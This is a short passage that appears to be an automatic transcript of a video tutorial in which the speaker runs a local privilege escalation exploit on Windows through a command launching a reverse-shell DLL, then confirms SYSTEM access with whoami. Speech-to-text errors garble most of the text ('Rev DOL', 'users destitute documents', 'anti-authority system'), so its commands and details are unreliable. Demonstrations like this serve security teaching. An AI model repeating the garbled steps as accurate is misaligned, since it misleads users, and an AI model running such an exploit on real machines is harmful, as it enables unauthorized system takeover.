: oops immediate C - C : users destitute documents and we'll do the same thing with Rev DOL and then let's go into this directory so now let's do cmd.exe /c LPC Exe Rev DLL and please subscribe to TFP on 1 we do Who am I we're anti-authority system so what happened before is we just put the machine in a weird state where this was not exploitable so there it is the LPC exploit working so hope you guys enjoyed it take care and I'll see you all next week